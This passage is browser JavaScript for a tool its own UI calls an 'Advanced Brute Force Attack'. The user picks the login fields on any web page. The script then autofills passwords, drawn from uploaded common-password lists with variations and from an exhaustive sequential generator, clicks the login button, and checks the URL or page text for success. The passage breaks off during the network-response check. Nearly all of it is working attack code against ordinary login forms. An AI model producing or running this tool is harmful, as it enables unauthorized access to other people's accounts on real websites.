                <input type="number" id="baseRateInput" value="${baseAutofillRate}" min="0" style="width: 100%;">
            </div>
            <div style="margin-bottom: 15px; display: flex; align-items: center;">
                <input type="checkbox" id="safeModeCheckbox" ${safeModeEnabled ? 'checked' : ''} style="margin-right: 10px;">
                <label for="safeModeCheckbox" style="color: var(--text-muted);">Enable Safe Mode</label>
            </div>
            <div style="margin-bottom: 15px;">
                <label for="maxRangeMsInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Max Range (ms) (Safe Mode):</label>
                <input type="number" id="maxRangeMsInput" value="${maxRangeMs}" min="0" ${!safeModeEnabled ? 'disabled' : ''} style="width: 100%;">
            </div>
            <div style="margin-bottom: 15px;">
                <label for="varianceInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Rate Variance (ms) (Normal Mode):</label>
                <input type="number" id="varianceInput" value="${autofillRateVariance}" min="0" style="width: 100%;">
            </div>
            <div style="margin-bottom: 15px;">
                <label for="speedSlider" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Speed Multiplier: <span id="speedValue">${speedMultiplier}x</span></label>
                <input type="range" id="speedSlider" min="1" max="100" value="${speedMultiplier}" step="1" style="width: 100%;">
            </div>
        </fieldset>

        <fieldset>
            <legend>Password Generation</legend>
            <div style="margin-bottom: 15px;">
                <label for="minLengthInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Min Password Length:</label>
                <input type="number" id="minLengthInput" value="${minPasswordLength}" min="1" style="width: 100%;">
            </div>
            <div style="margin-bottom: 15px;">
                <label for="maxLengthInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Max Password Length:</label>
                <input type="number" id="maxLengthInput" value="${maxPasswordLength}" min="1" style="width: 100%;">
            </div>
            <div style="margin-bottom: 15px; display: flex; align-items: center;">
                <input type="checkbox" id="includeCapitalizedCheckbox" ${includeCapitalized ? 'checked' : ''} style="margin-right: 10px;">
                <label for="includeCapitalizedCheckbox" style="color: var(--text-muted);">Include Capitalized Letters</label>
            </div>
            <div style="margin-bottom: 15px; display: flex; align-items: center;">
                <input type="checkbox" id="includeNumbersCheckbox" ${includeNumbers ? 'checked' : ''} style="margin-right: 10px;">
                <label for="includeNumbersCheckbox" style="color: var(--text-muted);">Include Numbers</label>
            </div>
            <div style="margin-bottom: 15px; display: flex; align-items: center;">
                <input type="checkbox" id="includeSymbolsCheckbox" ${includeSymbols ? 'checked' : ''} style="margin-right: 10px;">
                <label for="includeSymbolsCheckbox" style="color: var(--text-muted);">Include Symbols</label>
            </div>
            <div style="margin-bottom: 15px;">
                <label for="customCharactersInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Custom Characters (appended):</label>
                <textarea id="customCharactersInput" style="width: 100%; height: 60px;">${customCharacters}</textarea>
            </div>
        </fieldset>

        <fieldset>
            <legend>Login Behavior</legend>
            <div style="margin-bottom: 15px; display: flex; align-items: center;">
                <input type="checkbox" id="autofillUsernameCheckbox" ${autofillUsernameOnEachAttempt ? 'checked' : ''} style="margin-right: 10px;">
                <label for="autofillUsernameCheckbox" style="color: var(--text-muted);">Autofill Username on Each Attempt</label>
            </div>
            <div style="margin-bottom: 15px; display: flex; align-items: center;">
                <input type="checkbox" id="requireUsernameCheckbox" ${requireUsername ? 'checked' : ''} style="margin-right: 10px;">
                <label for="requireUsernameCheckbox" style="color: var(--text-muted);">Require Username</label>
            </div>
            <div style="margin-bottom: 15px; display: flex; align-items: center;">
                <input type="checkbox" id="useCommonPasswordsFirstCheckbox" ${useCommonPasswordsFirst ? 'checked' : ''} style="margin-right: 10px;">
                <label for="useCommonPasswordsFirstCheckbox" style="color: var(--text-muted);">Try Common Passwords First</label>
            </div>
        </fieldset>

        <fieldset>
            <legend>Success/Failure Detection</legend>
            <div style="margin-bottom: 15px;">
                <label for="successUrlInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Success URL Pattern (e.g., /dashboard):</label>
                <input type="text" id="successUrlInput" value="${successUrlPattern}" placeholder="e.g., /dashboard" style="width: 100%;">
            </div>
            <div style="margin-bottom: 15px;">
                <label for="successTextInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Success Text on Page (e.g., Welcome User):</label>
                <input type="text" id="successTextInput" value="${successTextPattern}" placeholder="e.g., Welcome User" style="width: 100%;">
            </div>
            <div style="margin-bottom: 15px;">
                <label for="failureTextInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Failure Text on Page (e.g., Invalid credentials):</label>
                <input type="text" id="failureTextInput" value="${failureTextPattern}" placeholder="e.g., Invalid credentials" style="width: 100%;">
            </div>
            <div style="margin-bottom: 15px; display: flex; align-items: center;">
                <input type="checkbox" id="checkNetworkResponsesCheckbox" ${checkNetworkResponses ? 'checked' : ''} style="margin-right: 10px;">
                <label for="checkNetworkResponsesCheckbox" style="color: var(--text-muted);">Check Network Responses</label>
            </div>
            <div style="margin-bottom: 15px;">
                <label for="expectedStatusCodeInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Expected Status Code (e.g., 200):</label>
                <input type="number" id="expectedStatusCodeInput" value="${expectedStatusCode}" min="100" max="599" ${!checkNetworkResponses ? 'disabled' : ''} style="width: 100%;">
            </div>
            <div style="margin-bottom: 15px;">
                <label for="successResponseTextInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Success Response Text (Network):</label>
                <input type="text" id="successResponseTextInput" value="${successResponseText}" placeholder="e.g., Login successful" ${!checkNetworkResponses ? 'disabled' : ''} style="width: 100%;">
            </div>
            <div style="margin-bottom: 15px;">
                <label for="failureResponseTextInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Failure Response Text (Network):</label>
                <input type="text" id="failureResponseTextInput" value="${failureResponseText}" placeholder="e.g., Error" ${!checkNetworkResponses ? 'disabled' : ''} style="width: 100%;">
            </div>
            <p style="font-size: 0.8em; color: var(--text-muted);">
                Leave patterns empty to disable that specific detection method.
                URL pattern checks if current URL contains the text.
                Text patterns check if page content contains the text (case-insensitive).
            </p>
        </fieldset>

        <fieldset>
            <legend>Password Lists</legend>
            <div style="margin-bottom: 15px;">
                <label for="commonPasswordsFileInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Add Common Passwords (.txt):</label>
                <input type="file" id="commonPasswordsFileInput" accept=".txt" style="width: 100%;">
                <div id="commonPasswordsStatus" style="margin-top: 5px; font-size: 0.8em; color: var(--text-muted);">0 passwords loaded.</div>
                <button id="clearCommonPasswordsButton" class="inspector-button" style="width: 100%; margin-top: 10px;">
                    Clear All Common Passwords
                </button>
            </div>
            <div style="margin-bottom: 15px;">
                <label for="excludedPasswordsFileInput" style="display: block; margin-bottom: 5px; color: var(--text-muted);">Upload Passwords to Exclude (.txt):</label>
                <input type="file" id="excludedPasswordsFileInput" accept=".txt" style="width: 100%;">
                <div id="excludedPasswordsStatus" style="margin-top: 5px; font-size: 0.8em; color: var(--text-muted);">0 passwords excluded.</div>
                <button id="clearExcludedPasswordsButton" class="inspector-button" style="width: 100%; margin-top: 10px;">
                    Clear Excluded Passwords
                </button>
            </div>
            <div style="margin-bottom: 15px;">
                <div id="failedPasswordsStatus" style="margin-top: 5px; font-size: 0.8em; color: var(--text-muted);">0 failed passwords logged.</div>
                <button id="clearFailedPasswordsButton" class="inspector-button" style="width: 100%; margin-top: 10px;">
                    Clear Failed Passwords
                </button>
            </div>
        </fieldset>
        <div style="display: flex; gap: 10px; margin-top: 15px;">
            <button id="saveSettingsButton" class="inspector-button" style="flex: 1;">
                Save Settings
            </button>
            <button id="resetSettingsButton" class="inspector-button" style="flex: 1;">
                Reset All Settings
            </button>
        </div>
    `;

    const logHtml = `
        <div id="inspectorLog" style="width: 100%; height: 200px; padding: 10px; border: 1px solid var(--log-border); border-radius: 4px; background-color: var(--log-bg); color: var(--text-muted); font-size: 0.8em; overflow-y: scroll; text-align: left;">
            <!-- Log entries will appear here -->
        </div>
        <button id="clearLogButton" class="inspector-button" style="width: 100%; padding: 8px; margin-top: 10px;">
            Clear Log
        </button>
        <button id="downloadLogButton" class="inspector-button" style="width: 100%; padding: 8px; margin-top: 10px;">
            Download Activity Log (.txt)
        </button>
    `;

    const performanceHtml = `
        <div style="width: 100%; height: calc(100% - 30px); display: flex; flex-direction: column;">
            <div style="text-align: center; margin-bottom: 10px; color: var(--text-light); font-size: 0.9em;">Password Attempt Speed (ms)</div>
            <canvas id="performanceGraphCanvas" style="flex-grow: 1;"></canvas>
            <div style="text-align: center; margin-top: 10px; color: var(--text-light); font-size: 0.9em;">Attempt Number</div>
        </div>
    `;

    // --- Initial Setup and UI Creation ---
    loadSettings(); // Load settings before creating windows to apply defaults

    // Remove existing instances if script is run multiple times
    if (document.getElementById('draggable-inspector-window')) {
        document.getElementById('draggable-inspector-window').remove();
        document.getElementById('inspector-log-window')?.remove();
        document.getElementById('inspector-settings-window')?.remove();
        document.getElementById('inspector-toggle-dot')?.remove();
        document.getElementById('inspector-performance-window')?.remove();
        logAction('Removed existing instances of the tool.');
    }

    // Create the draggable windows
    const inspectorWindow = createDraggableWindow('draggable-inspector-window', 'Advanced Brute Force Attack', mainInspectorHtml, 400, 560);
    const settingsWindow = createDraggableWindow('inspector-settings-window', 'Settings', settingsHtml, 350, 680); // Increased height for new settings
    const logWindow = createDraggableWindow('inspector-log-window', 'Activity Log', logHtml, 400, 280);
    const performanceWindow = createDraggableWindow('inspector-performance-window', 'Performance Graph', performanceHtml, 600, 400);

    // Get reference to inspectorLog after it's created and flush any pending messages
    inspectorLog = document.getElementById('inspectorLog');
    flushTempLog();

    // Get canvas and context for performance graph
    const performanceCanvas = performanceWindow.querySelector('#performanceGraphCanvas');
    const performanceCtx = performanceCanvas ? performanceCanvas.getContext('2d') : null;

    // Initially hide settings, log, and performance windows
    settingsWindow.style.display = 'none';
    logWindow.style.display = 'none';
    performanceWindow.style.display = 'none';

    // Create the orange toggle dot
    const toggleDot = document.createElement('div');
    toggleDot.id = 'inspector-toggle-dot';
    toggleDot.style.cssText = `
        position: fixed;
        top: 10px;
        left: 10px;
        width: 15px;
        height: 15px;
        background-color: var(--primary-color);
        border-radius: 50%;
        cursor: pointer;
        z-index: 99998;
        transition: background-color 0.2s ease, transform 0.2s ease;
    `;
    document.body.appendChild(toggleDot);

    // Add hover effect for the dot
    toggleDot.addEventListener('mouseenter', () => {
        toggleDot.style.transform = 'scale(1.1)';
    });
    toggleDot.addEventListener('mouseleave', () => {
        toggleDot.style.transform = 'scale(1)';
    });

    // --- Get References to UI Elements ---
    const consoleUsernameButton = document.getElementById('consoleUsernameButton');
    const consolePasswordButton = document.getElementById('consolePasswordButton');
    const consoleLoginButton = document.getElementById('consoleLoginButton');
    const yourUsernameInput = document.getElementById('yourUsernameInput');
    const startButton = document.getElementById('startButton');
    const pauseButton = document.getElementById('pauseButton');
    const stopButton = document.getElementById('stopButton');
    const consoleResultInput = document.getElementById('consoleResultInput');
    const statusDisplay = document.getElementById('statusDisplay');

    const clearLogButton = document.getElementById('clearLogButton');
    const downloadLogButton = document.getElementById('downloadLogButton');
    const downloadAllDataButton = document.getElementById('downloadAllDataButton');
    const importInstanceButton = document.getElementById('importInstanceButton');

    // Main Inspector Element Displays
    const usernameElementDisplay = document.getElementById('usernameElementDisplay');
    const usernameElementInfo = document.getElementById('usernameElementInfo');
    const passwordElementDisplay = document.getElementById('passwordElementDisplay');
    const passwordElementInfo = document.getElementById('passwordElementInfo');
    const loginButtonElementDisplay = document.getElementById('loginButtonElementDisplay');
    const loginButtonElementInfo = document.getElementById('loginButtonElementInfo');

    // Settings inputs
    const baseRateInput = document.getElementById('baseRateInput');
    const varianceInput = document.getElementById('varianceInput');
    const minLengthInput = document.getElementById('minLengthInput');
    const maxLengthInput = document.getElementById('maxLengthInput');
    const includeCapitalizedCheckbox = document.getElementById('includeCapitalizedCheckbox');
    const includeNumbersCheckbox = document.getElementById('includeNumbersCheckbox');
    const includeSymbolsCheckbox = document.getElementById('includeSymbolsCheckbox');
    const autofillUsernameCheckbox = document.getElementById('autofillUsernameCheckbox');
    const customCharactersInput = document.getElementById('customCharactersInput');
    const saveSettingsButton = document.getElementById('saveSettingsButton');
    const resetSettingsButton = document.getElementById('resetSettingsButton');
    const speedSlider = document.getElementById('speedSlider');
    const speedValueDisplay = document.getElementById('speedValue');

    // Safe Mode elements
    const safeModeCheckbox = document.getElementById('safeModeCheckbox');
    const maxRangeMsInput = document.getElementById('maxRangeMsInput');

    // Username optional elements
    const requireUsernameCheckbox = document.getElementById('requireUsernameCheckbox');

    // Common Passwords elements
    const commonPasswordsFileInput = document.getElementById('commonPasswordsFileInput');
    const commonPasswordsStatus = document.getElementById('commonPasswordsStatus');
    const clearCommonPasswordsButton = document.getElementById('clearCommonPasswordsButton');

    // Excluded Passwords elements
    const excludedPasswordsFileInput = document.getElementById('excludedPasswordsFileInput');
    const excludedPasswordsStatus = document.getElementById('excludedPasswordsStatus');
    const clearExcludedPasswordsButton = document.getElementById('clearExcludedPasswordsButton');

    // Failed Passwords elements
    const failedPasswordsStatus = document.getElementById('failedPasswordsStatus');
    const clearFailedPasswordsButton = document.getElementById('clearFailedPasswordsButton');

    // Success/Failure Detection inputs
    const successUrlInput = document.getElementById('successUrlInput');
    const failureTextInput = document.getElementById('failureTextInput');
    const successTextInput = document.getElementById('successTextInput');
    const checkNetworkResponsesCheckbox = document.getElementById('checkNetworkResponsesCheckbox'); // New
    const expectedStatusCodeInput = document.getElementById('expectedStatusCodeInput'); // New
    const successResponseTextInput = document.getElementById('successResponseTextInput'); // New
    const failureResponseTextInput = document.getElementById('failureResponseTextInput'); // New

    const openPerformanceButton = document.getElementById('openPerformanceButton');
    const openSettingsButton = document.getElementById('openSettingsButton');
    const openLogButton = document.getElementById('openLogButton');

    // --- Web Worker for File Processing ---
    // Worker script content as a string
    const workerScriptContent = `
    self.onmessage = function(e) {
        const { content, logPrefix, isSet, type } = e.data;
        const lines = content.split(/\\r?\\n/).map(line => line.trim()).filter(line => line.length > 0);
        const totalLines = lines.length;
        let processedLines = 0;
        const chunkSize = 50000; // Process in chunks to avoid blocking UI

        let collection = isSet ? new Set() : [];

        function processChunk() {
            const start = processedLines;
            const end = Math.min(processedLines + chunkSize, totalLines);
            const currentChunk = lines.slice(start, end);

            currentChunk.forEach(item => {
                if (item) {
                    if (isSet) {
                        collection.add(item);
                    } else {
                        collection.push(item);
                    }
                }
            });

            processedLines = end;

            // Send progress back to main thread
            self.postMessage({
                type: 'progress',
                logPrefix: logPrefix,
                processed: processedLines,
                total: totalLines
            });

            if (processedLines < totalLines) {
                setTimeout(processChunk, 0); // Schedule next chunk in worker's event loop
            } else {
                // Send final data back to main thread
                self.postMessage({
                    type: 'complete',
                    logPrefix: logPrefix,
                    data: isSet ? Array.from(collection) : collection, // Convert Set to Array for transfer
                    dataType: type
                });
            }
        }
        processChunk();
    };
    `;

    let fileProcessingWorker = null;
    if (window.Worker) {
        const blob = new Blob([workerScriptContent], { type: 'application/javascript' });
        const workerUrl = URL.createObjectURL(blob);
        fileProcessingWorker = new Worker(workerUrl);

        fileProcessingWorker.onmessage = function(e) {
            const { type, logPrefix, processed, total, data, dataType } = e.data;
            if (type === 'progress') {
                const statusDisplayElement = logPrefix.includes('common') ? commonPasswordsStatus : excludedPasswordsStatus;
                statusDisplayElement.textContent = `Processing ${logPrefix}: ${processed}/${total} lines...`;
            } else if (type === 'complete') {
                if (dataType === 'common') {
                    uploadedCommonPasswords = data;
                    commonPasswordsStatus.textContent = `${uploadedCommonPasswords.length} common passwords loaded.`;
                    logAction(`Finished processing common passwords. Total: ${uploadedCommonPasswords.length}.`);
                    currentCommonPasswordIndex = 0;
                    commonPasswordsExhausted = false;
                } else if (dataType === 'excluded') {
                    excludedPasswords = new Set(data);
                    excludedPasswordsStatus.textContent = `${excludedPasswords.size} excluded passwords loaded.`;
                    logAction(`Finished processing excluded passwords. Total: ${excludedPasswords.size}.`);
                }
            }
        };

        fileProcessingWorker.onerror = function(error) {
            logAction(`Error in file processing worker: ${error.message}`);
            console.error('Worker error:', error);
        };
    } else {
        logAction('Warning: Web Workers are not supported in this browser. Large file processing may cause UI freezes.');
    }

    /**
     * Processes file content using a Web Worker (or fallback) to avoid UI freezing.
     * @param {File} file - The file object to process.
     * @param {HTMLElement} statusDisplayElement - The DOM element to update with status.
     * @param {string} logPrefix - Prefix for log messages (e.g., "Common passwords").
     * @param {string} dataType - 'common' or 'excluded' to identify the type of data being processed.
     */
    function processFileWithWorker(file, statusDisplayElement, logPrefix, dataType) {
        statusDisplayElement.textContent = `Reading "${file.name}"...`;
        logAction(`Reading file "${file.name}" for ${logPrefix}.`);

        const reader = new FileReader();
        reader.onload = (e) => {
            const content = e.target.result;
            const estimatedLines = content.split(/\r?\n/).length;
            if (estimatedLines > 1000000) {
                logAction(`Warning: File "${file.name}" is very large (${estimatedLines} lines). Processing may still take significant time.`);
            }

            if (fileProcessingWorker) {
                fileProcessingWorker.postMessage({
                    content: content,
                    logPrefix: logPrefix,
                    isSet: dataType === 'excluded',
                    type: dataType
                });
                logAction(`Sent "${file.name}" to worker for processing.`);
            } else {
                // Fallback for browsers without Web Workers
                logAction('Web Worker not available. Processing file on main thread (may cause lag).');
                const lines = content.split(/\r?\n/).map(line => line.trim()).filter(line => line.length > 0);
                if (dataType === 'common') {
                    uploadedCommonPasswords = lines;
                    commonPasswordsStatus.textContent = `${uploadedCommonPasswords.length} common passwords loaded.`;
                    logAction(`Finished processing common passwords. Total: ${uploadedCommonPasswords.length}. (Fallback)`);
                    currentCommonPasswordIndex = 0;
                    commonPasswordsExhausted = false;
                } else if (dataType === 'excluded') {
                    excludedPasswords = new Set(lines);
                    excludedPasswordsStatus.textContent = `${excludedPasswords.size} excluded passwords loaded.`;
                    logAction(`Finished processing excluded passwords. Total: ${excludedPasswords.size}. (Fallback)`);
                }
            }
        };
        reader.onerror = (e) => {
            statusDisplayElement.textContent = 'Error reading file.';
            logAction('Error reading file: ' + e.message);
        };
        reader.readAsText(file);
    }

    // --- Element Selection Logic ---
    /**
     * Activates the element selection mode.
     * @param {string} fieldType - 'username', 'password', or 'loginButton'
     */
    function activateSelectionMode(fieldType) {
        if (fieldType === 'username' && !requireUsername) {
            logAction('Cannot select username field: Username is not required in settings.');
            return;
        }

        isSelectingElement = true;
        currentFieldToPopulate = fieldType;
        consoleResultInput.value = `Click on an element on the page to select the ${fieldType} field.`;
        consoleResultInput.style.color = 'var(--primary-color)';
        document.body.style.cursor = 'crosshair';
        logAction(`Selection mode activated for: ${fieldType}`);
    }

    // Global click listener for selecting elements on the page
    document.addEventListener('click', (event) => {
        if (!isSelectingElement) {
            return;
        }

        // Prevent selection of elements within the tool's own UI
        if (inspectorWindow.contains(event.target) || settingsWindow.contains(event.target) || logWindow.contains(event.target) || toggleDot.contains(event.target) || performanceWindow.contains(event.target)) {
            return;
        }

        const clickedElement = event.target;
        const elementId = clickedElement.id || 'No ID';
        const elementClass = clickedElement.className || 'No Class';
        const tagName = clickedElement.tagName.toLowerCase();

        let isValidSelection = false;
        if (currentFieldToPopulate === 'username' || currentFieldToPopulate === 'password') {
            // Must be an input field of type text, password, or email
            if (tagName === 'input' && (clickedElement.type === 'text' || clickedElement.type === 'password' || clickedElement.type === 'email')) {
                isValidSelection = true;
            } else {
                logAction(`Error: Selected element for ${currentFieldToPopulate} is not a valid input field (text, password, or email).`);
            }
        } else if (currentFieldToPopulate === 'loginButton') {
            // Must be a button or an input of type submit
            if (tagName === 'button' || (tagName === 'input' && clickedElement.type === 'submit')) {
                isValidSelection = true;
            } else {
                logAction(`Error: Selected element for login button is not a valid button or submit input.`);
            }
        }

        if (!isValidSelection) {
            consoleResultInput.value = `Invalid selection for ${currentFieldToPopulate}. Please try again.`;
            consoleResultInput.style.color = 'var(--danger-color)';
            event.preventDefault();
            event.stopImmediatePropagation();
            return;
        }

        // Store the selected element reference and update display
        const elementInfo = `<${tagName}> (ID: "${elementId}", Class: "${elementClass}")`;
        if (currentFieldToPopulate === 'username') {
            selectedUsernameElement = clickedElement;
            usernameElementInfo.textContent = elementInfo;
            usernameElementDisplay.style.display = 'flex';
        } else if (currentFieldToPopulate === 'password') {
            selectedPasswordElement = clickedElement;
            passwordElementInfo.textContent = elementInfo;
            passwordElementDisplay.style.display = 'flex';
        } else if (currentFieldToPopulate === 'loginButton') {
            selectedLoginButtonElement = clickedElement;
            loginButtonElementInfo.textContent = elementInfo;
            loginButtonElementDisplay.style.display = 'flex';
        }

        highlightElement(clickedElement); // Visual feedback
        const collectedInfoMessage = `Selected ${currentFieldToPopulate}: ${elementInfo}`;
        consoleResultInput.value = collectedInfoMessage;
        consoleResultInput.style.color = 'var(--success-text)';
        logAction(`Successfully selected ${currentFieldToPopulate} element: ${elementInfo}`);

        // Deactivate selection mode
        isSelectingElement = false;
        currentFieldToPopulate = null;
        document.body.style.cursor = 'default';

        event.preventDefault();
        event.stopImmediatePropagation();
    }, true); // Use capture phase to ensure our listener runs first

    // --- Password Generation Logic ---

    // Generator for sequential passwords (e.g., a, b, ..., z, aa, ab, ...)
    function* sequentialPasswordGenerator(chars, minLen, maxLen) {
        const n = chars.length;
        let indices = new Array(minLen).fill(0); // Start with min length, all first chars

        while (true) {
            let currentPassword = indices.map(idx => chars[idx]).join('');

            // Check if current password exceeds max length
            if (currentPassword.length > maxLen) {
                return; // Stop iteration
            }

            // Yield the current password
            yield currentPassword;

            // Increment the password
            let i = indices.length - 1;
            while (i >= 0) {
                if (indices[i] < n - 1) {
                    indices[i]++;
                    break; // Successfully incremented
                } else {
                    indices[i] = 0; // Reset current char to first
                    i--; // Move to previous char
                }
            }

            if (i < 0) {
                // All combinations for current length exhausted, increase length
                indices = new Array(indices.length + 1).fill(0);
                if (indices.length > maxLen) {
                    return; // Max length reached, stop
                }
            }
        }
    }

    // Generator for common passwords and their variations
    function* commonPasswordVariationsGenerator(commonPasswords) {
        for (const basePassword of commonPasswords) {
            // Yield original common password
            yield basePassword;

            // Generate simple variations (can be expanded)
            if (basePassword.length > 0) {
                yield basePassword.charAt(0).toUpperCase() + basePassword.slice(1); // Capitalize first letter
                yield basePassword.toLowerCase(); // Ensure lowercase version
                yield basePassword.toUpperCase(); // Ensure uppercase version
            }
            yield basePassword + '1';
            yield basePassword + '123';
            yield basePassword + '!';
            yield basePassword + '@';
            yield basePassword + '2024';
            // Add more variations as needed for common password list
        }
    }

    let currentPasswordGenerator = null; // Stores the active generator (common or sequential)
    let sequentialGenInstance = null; // Stores the instance of the sequential generator

    /**
     * Initializes the password generation process based on settings.
     */
    function initializePasswordGeneration() {
        // Reset flags and indices
        commonPasswordsExhausted = false;
        currentCommonPasswordIndex = 0;
        currentPasswordLength = minPasswordLength; // Start sequential generation from min length

        // Update the character set based on current settings
        updateCharacterSet();

        if (useCommonPasswordsFirst && uploadedCommonPasswords.length > 0) {
            logAction(`Starting with common passwords (${uploadedCommonPasswords.length} available).`);
            // Filter common passwords by length and excluded list once
            const filteredCommonPasswords = uploadedCommonPasswords.filter(p =>
                p.length >= minPasswordLength && p.length <= maxPasswordLength && !excludedPasswords.has(p)
            );
            if (filteredCommonPasswords.length > 0) {
                currentPasswordGenerator = commonPasswordVariationsGenerator(filteredCommonPasswords);
            } else {
                logAction('No valid common passwords found after filtering. Switching to generated passwords.');
                commonPasswordsExhausted = true; // No common passwords to try
                sequentialGenInstance = sequentialPasswordGenerator(currentCharacterSet, minPasswordLength, maxPasswordLength);
                currentPasswordGenerator = sequentialGenInstance;
            }
        } else {
            logAction('Starting with generated passwords.');
            commonPasswordsExhausted = true; // No common passwords to try
            sequentialGenInstance = sequentialPasswordGenerator(currentCharacterSet, minPasswordLength, maxPasswordLength);
            currentPasswordGenerator = sequentialGenInstance;
        }
    }

    /**
     * Gets the next password to attempt, handling common passwords first, then sequential.
     * Filters out excluded passwords.
     * @returns {string|null} The next password or null if exhausted.
     */
    function getNextPassword() {
        let nextPass = null;
        let attempts = 0;
        const MAX_SKIP_ATTEMPTS = 10000; // Prevent infinite loop if too many exclusions

        while (attempts < MAX_SKIP_ATTEMPTS) {
            attempts++;
            const { value, done } = currentPasswordGenerator.next();

            if (done) {
                if (currentPasswordGenerator === sequentialGenInstance) {
                    // All sequential passwords exhausted
                    logAction('All generated passwords exhausted. Stopping guessing.');
                    return null;
                } else {
                    // Common passwords exhausted, switch to sequential
                    logAction('All common passwords exhausted. Switching to generated passwords.');
                    commonPasswordsExhausted = true;
                    sequentialGenInstance = sequentialPasswordGenerator(currentCharacterSet, minPasswordLength, maxPasswordLength);
                    currentPasswordGenerator = sequentialGenInstance;
                    // Try to get the first sequential password
                    const { value: seqValue, done: seqDone } = currentPasswordGenerator.next();
                    if (seqDone) {
                        logAction('No generated passwords available. Stopping guessing.');
                        return null;
                    }
                    nextPass = seqValue;
                }
            } else {
                nextPass = value;
            }

            // Check if the generated password is in the excluded list
            if (excludedPasswords.has(nextPass)) {
                logAction(`Skipping excluded password: "${nextPass}"`);
                continue; // Try next password
            }

            // Ensure password meets length criteria (already handled by generators, but as a final check)
            if (nextPass.length >= minPasswordLength && nextPass.length <= maxPasswordLength) {
                currentPasswordAttempt = nextPass; // Update global state
                currentPasswordLength = nextPass.length; // Update global state
                return nextPass;
            } else {
                logAction(`Skipping password "${nextPass}" due to length constraints.`);
                continue;
            }
        }

        logAction('Could not find a non-excluded password within reasonable attempts. Stopping guessing.');
        return null; // No valid password found after many skips
    }


    /**
     * Attempts to autofill the password and click the login button.
     */
    async function attemptPassword() {
        if (!isGuessingPasswords || isPaused) { // Check for pause state
            logAction('Password guessing paused or stopped.');
            return;
        }

        const startTime = performance.now(); // Record start time

        // --- Pre-check selected elements for validity and existence ---
        const checkElement = (elem, name, types, required) => {
            if (required && (!elem || !document.body.contains(elem) || !types.some(type => (elem.tagName === 'INPUT' && elem.type === type) || (elem.tagName === 'BUTTON' && type === 'button')))) {
                logAction(`Error: Selected ${name} field is invalid or no longer exists in the DOM. Stopping guessing.`);
                isGuessingPasswords = false;
                statusDisplay.textContent = `Status: Stopped (${name} invalid/missing)`;
                return false;
            }
            if (elem && (elem.readOnly || elem.disabled)) {
                logAction(`Error: Selected ${name} field is read-only or disabled. Stopping guessing.`);
                isGuessingPasswords = false;
                statusDisplay.textContent = `Status: Stopped (${name} read-only/disabled)`;
                return false;
            }
            return true;
        };

        if (!checkElement(selectedPasswordElement, 'Password', ['password', 'text'], true)) return;
        if (!checkElement(selectedLoginButtonElement, 'Login button', ['submit', 'button'], true)) return;
        if (requireUsername && !checkElement(selectedUsernameElement, 'Username', ['text', 'email'], true)) return;


        // --- Get Next Password ---
        const passwordToTry = getNextPassword();
        if (!passwordToTry) {
            // Password generation exhausted or no valid passwords found
            isGuessingPasswords = false;
            statusDisplay.textContent = 'Status: Password List Exhausted';
            logAction('Password generation exhausted. Stopping guessing.');
            return;
        }


        // --- Autofill Username (if required and enabled) ---
        if (requireUsername && autofillUsernameOnEachAttempt && selectedUsernameElement) {
            const usernameToAutofill = yourUsernameInput.value;
            selectedUsernameElement.value = usernameToAutofill;
            // Dispatch input and change events to simulate user typing
            selectedUsernameElement.dispatchEvent(new Event('input', { bubbles: true }));
            selectedUsernameElement.dispatchEvent(new Event('change', { bubbles: true }));
            // logAction(`Autofilled username field with "${usernameToAutofill}".`); // Too verbose
        }

        // --- Autofill Password ---
        // Temporarily change password field type to text for visibility during autofill
        // This change is now persistent until stopped or closed.
        if (selectedPasswordElement.type === 'password') {
            selectedPasswordElement.type = 'text';
            logAction('Password field type changed to "text" for visibility.');
        }
        selectedPasswordElement.focus(); // Focus the field
        selectedPasswordElement.value = passwordToTry;
        // Dispatch input and change events for password field
        selectedPasswordElement.dispatchEvent(new Event('input', { bubbles: true }));
        selectedPasswordElement.dispatchEvent(new Event('change', { bubbles: true }));
        statusDisplay.textContent = `Status: Trying "${passwordToTry}" (Length: ${passwordToTry.length})`;
        logAction(`Attempting with password: "${passwordToTry}"`);

        // Small delay to allow the page's JS to process input before clicking
        await new Promise(r => setTimeout(r, 10));

        // --- Click Login Button ---
        selectedLoginButtonElement.click();
        // logAction('Login button clicked.'); // Too verbose

        // --- Success/Failure Detection ---
        // This is the most critical part you'll need to customize for your target.
        // A generic browser script cannot reliably detect login success/failure without specific knowledge of the target page's behavior.
        // You would typically check for:
        // 1. URL change (e.g., redirect to /dashboard)
        // 2. Presence/absence of specific elements (e.g., "Login failed" message, "Welcome user" message)
        // 3. Changes in local storage or cookies
        // 4. Network responses (if you were using fetch/XMLHttpRequest instead of direct DOM clicks)

        // Wait for page to react after login attempt
        await new Promise(r => setTimeout(r, 500)); // Consider making this delay configurable

        let loginSuccess = false;
        let loginFailure = false;

        // 1. Check for URL change
        if (successUrlPattern && window.location.href.includes(successUrlPattern)) {
            loginSuccess = true;
            logAction(`SUCCESS! URL pattern matched: "${successUrlPattern}" for password: "${passwordToTry}"`);
        }

        // 2. Check for success text on page (only if not already successful by URL)
        if (!loginSuccess && successTextPattern && document.body.innerText.toLowerCase().includes(successTextPattern.toLowerCase())) {
            loginSuccess = true;
            logAction(`SUCCESS! Success text found: "${successTextPattern}" for password: "${passwordToTry}"`);
        }

        // 3. Check for failure text on page (only if not already successful)
        if (!loginSuccess && failureTextPattern && document.body.innerText.toLowerCase().includes(failureTextPattern.toLowerCase())) {
            loginFailure = true;
            logAction(`FAILED! Failure text found: "${failureTextPattern}" for password: "${passwordToTry}"`);
        }

        // 4. Check network responses if enabled (this is a simplified example, actual implementation would involve intercepting XHR/Fetch)
        // For a true network response check, you'd need to use browser devtools protocols or a proxy.
        // This example is illustrative and assumes a direct way to check the *last* response, which isn't always available.
        if (checkNetworkResponses) {
            // This part is highly conceptual for a browser extension/tool.
            // In a real scenario, you'd monitor network requests.
